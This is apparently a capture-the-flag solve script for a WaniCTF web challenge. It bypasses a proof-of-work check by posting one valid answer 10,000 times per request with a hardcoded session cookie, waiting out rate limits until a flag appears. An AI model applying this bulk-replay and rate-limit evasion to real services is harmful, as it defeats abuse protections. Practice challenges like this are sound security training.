import requests
import json
import re
import time 

headers = {
    "Cookie": "pow_session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uSWQiOiI2Y2YwMTIzZS01OTc2LTQ2YzktYjRlNC1lNTMyZTAwNDAzOTcifQ.AtRcv0DHZJxbiDHgq_s9QQRB-OsiuDCeEtP4Zxvaew8"
}

url = "https://web-pow-lz56g6.wanictf.org/api/pow"

data = ["2862152"] * 10000

# Define the regex pattern
pattern = r"(?<=progress: )\d+(?= /)"
progress = 0
rate_limit_time = 0
while int(progress) < 1000000:
    progress_res = requests.post(url, headers=headers,data=json.dumps(data))

    if progress_res.status_code == 200:

        if "FLAG" in progress_res.text:
            break

        # Search for the pattern in the input string
        match = re.search(pattern, progress_res.text)

        # Extract the number if the pattern is found
        if match:
            number = match.group(0)
            progress = number
            print(f"\r{progress}", end='')
    
    if progress_res.status_code == 429:
        print(f"\rRate Limit", end='')
        time.sleep(61)

print(progress_res.text)